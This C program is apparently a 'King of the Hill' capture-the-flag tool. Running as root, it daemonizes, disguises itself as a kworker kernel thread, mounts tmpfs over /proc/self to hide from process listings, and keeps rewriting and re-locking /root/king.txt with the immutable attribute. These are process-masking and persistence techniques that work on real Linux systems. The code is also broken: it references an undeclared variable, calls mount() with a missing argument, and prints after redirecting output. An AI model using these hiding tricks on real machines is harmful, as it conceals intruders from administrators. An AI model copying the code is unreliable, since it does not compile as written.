#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <linux/fs.h>

#define MASKED_NAME "[kworker/5:2]"	    // whatever name you want for the process
#define TARGET_FILE "/root/king.txt"	    // path for wherever the file is
#define TARGET_USER "your-username"	    // your username
#define TARGET_PROCESS "/proc/self"
#define TARGET_FILESYSTEM "tmpfs"
#define MOUNT_FLAG 0                        // flag for new mount creation
#define MOUNT_DATA NULL                     // manual says keep NULL

void Daemonize() {

    pid_t pid;

    // first fork
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);        // parent exists

    // create a new session
    if (setsid() < 0) exit(EXIT_FAILURE);

    // second fork
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);        // first child exists

    // set file and dir perms
    umask(022);                             // slightly safer than 0 xD
    if (chdir("/") < 0) exit(EXIT_FAILURE); // change to root directory to detect any locked mounts

    // close all file descriptors
    // sysconf(_SC_OPEN_MAX) basically tells us how much fd can this process open, usually it is 1024
    long maxfd = sysconf(_SC_OPEN_MAX);
    if (max < 0) maxfd = 1024;
    for (int i = maxfd; i >= 0; i--) close (i);

    // redirect stdin, stdout, stderr to /dev/null
    int fd = open("/dev/null", O_RDWR);
    dup2(fd, 0);                            // stdin
    dup2(fd, 1);                            // stdout
    dup2(fd, 2);                            // stderr
}

void MaskTheName(char **argv) {
    // changing process name for ps or top
    prctl(PR_SET_NAME, MASKED_NAME, 0, 0, 0);

    // changing cli args shown in ps aux
    memset(argv[0], 0, strlen(argv[0]));
    strncpy(argv[0], MASKED_NAME, strlen(MASKED_NAME));

    // mount /proc/self to tmpfs
    if (mount(TARGET_FILESYSTEM, TARGET_PROCESS, TARGET_FILESYSTEM, MOUNT_DATA) == 0) {
        printf("Mount successful \n");
    } else {
        printf("error occurred while mounting tmpfs!\n");
    }
}

void GetTheHill() {
    int fd;
    int ImmutableAttribute = FS_IMMUTABLE_FL;
    int ClearAttribute = 0;

    // clear set attributes, if any, by someone else
    fd = open(TARGET_FILE, O_RDONLY);
    if (fd != -1) {
        ioctl(fd, FS_IOC_SETFLAGS, &ClearAttribute);
        close(fd);
    }

    // writing name in the file
    fd = open(TARGET_FILE, O_WRONLY | O_TRUNC);
    if (fd != -1) {
        write(fd, TARGET_USER, strlen(TARGET_USER));
        close(fd);
    }

    // locking the file with attribute +i, i.e., immutable
    fd = open(TARGET_FILE, O_RDONLY);
    if (fd != -1) {
        ioctl(fd, FS_IOC_SETFLAGS, &ImmutableAttribute);
        close(fd);
    }
}

int main (int argc, char *argv[]) {
    if (getuid() != 0) {
        printf("Root privileges are required.\n");
        return 1;
    }

    Daemonize();
    MaskTheName(argv);

    // persistent loop
    while (1) {
        GetTheHill();
        sleep(2);
    }

    return 0;
}
